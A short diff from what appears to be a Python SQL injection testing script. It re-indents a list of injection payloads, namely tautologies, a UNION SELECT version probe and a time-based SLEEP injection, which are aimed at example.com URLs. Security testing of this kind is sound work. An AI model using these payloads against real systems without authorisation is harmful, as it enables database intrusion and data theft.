@@ -5,10 +5,10 @@ url = "https://example.com/product?id="
 login_url = "https://example.com/login"
 
 payloads = [
-        "1' OR '1'='1",
-    "1' OR 'a'='a",
-    "' UNION SELECT null, version() --",
-    "1' AND (SELECT SLEEP(5)) --"
+         "1' OR '1'='1",
+         "1' OR 'a'='a",
+         "' UNION SELECT null, version() --",
+         "1' AND (SELECT SLEEP(5)) --"
 ]
 
 def test_get_sqli(url):
